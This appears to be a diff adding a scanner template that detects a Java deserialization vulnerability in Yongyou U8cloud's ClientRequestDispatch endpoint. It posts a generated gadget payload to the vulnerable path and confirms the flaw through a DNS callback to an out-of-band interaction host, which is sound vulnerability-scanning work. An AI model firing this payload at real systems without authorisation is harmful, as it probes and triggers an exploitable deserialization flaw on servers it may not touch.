@@ -1,0 +1,29 @@
+id: poc-yaml-yongyou-u8cloud-clientrequestdispatch-deserialization
+info:
+  name: Yongyou U8cloud ClientRequestDispatch Deserialization Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, deserialization
+
+variables:
+  reverse_url: "{{interactsh-url}}"
+  payload: "{{generate_java_gadget('dns', reverse_url, 'raw')}}"
+
+http:
+  - method: POST
+    path:
+      - "/service/~aim/nc.ui.iufo.jiuqi.ClientRequestDispatch"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "{{payload}}"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
